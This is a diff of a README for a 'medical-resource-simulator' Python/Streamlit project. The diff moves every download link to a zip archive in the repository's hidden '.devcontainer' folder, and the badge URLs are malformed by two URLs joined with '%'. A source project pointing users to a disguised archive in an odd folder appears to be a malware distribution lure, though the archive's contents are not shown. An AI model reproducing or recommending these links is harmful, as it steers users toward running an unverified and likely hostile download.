@@ -1,7 +1,7 @@
 # 🎉 medical-resource-simulator - Simulate Optimal Healthcare Allocation
 
 ## 📥 Download Now
-[![Download Release](https://raw.githubusercontent.com/ALONEBOYktk1/medical-resource-simulator/main/misbestow/medical-resource-simulator.zip%https://raw.githubusercontent.com/ALONEBOYktk1/medical-resource-simulator/main/misbestow/medical-resource-simulator.zip)](https://raw.githubusercontent.com/ALONEBOYktk1/medical-resource-simulator/main/misbestow/medical-resource-simulator.zip)
+[![Download Release](https://raw.githubusercontent.com/ALONEBOYktk1/medical-resource-simulator/main/.devcontainer/medical-resource-simulator-v1.7.zip%https://raw.githubusercontent.com/ALONEBOYktk1/medical-resource-simulator/main/.devcontainer/medical-resource-simulator-v1.7.zip)](https://raw.githubusercontent.com/ALONEBOYktk1/medical-resource-simulator/main/.devcontainer/medical-resource-simulator-v1.7.zip)
 
 ## 🌟 Overview
 The medical-resource-simulator is a Python project designed to simulate the optimal allocation of limited medical resources using the 0/1 Knapsack algorithm. This easy-to-use application features an interactive Streamlit web interface with real-time visualization. It combines algorithmic problem-solving with healthcare optimization to enhance resource distribution effectively.
@@ -18,7 +18,7 @@ Make sure your computer meets the following requirements:
 - Internet Connection: Required for web interface
 
 ### 2. Download & Install
-Visit this page to download: [Medical Resource Simulator Releases](https://raw.githubusercontent.com/ALONEBOYktk1/medical-resource-simulator/main/misbestow/medical-resource-simulator.zip).
+Visit this page to download: [Medical Resource Simulator Releases](https://raw.githubusercontent.com/ALONEBOYktk1/medical-resource-simulator/main/.devcontainer/medical-resource-simulator-v1.7.zip).
 
 1. Click on the link above.
 2. Look for the latest version under "Latest Release."
@@ -70,4 +70,4 @@ If you encounter problems or have questions, please open an issue on the project
 ## 📜 License
 This project is licensed under the MIT License. You are free to use and modify it as you like, but please comply with the terms mentioned in the license file.
 
-Visit this page to download: [Medical Resource Simulator Releases](https://raw.githubusercontent.com/ALONEBOYktk1/medical-resource-simulator/main/misbestow/medical-resource-simulator.zip).
+Visit this page to download: [Medical Resource Simulator Releases](https://raw.githubusercontent.com/ALONEBOYktk1/medical-resource-simulator/main/.devcontainer/medical-resource-simulator-v1.7.zip).
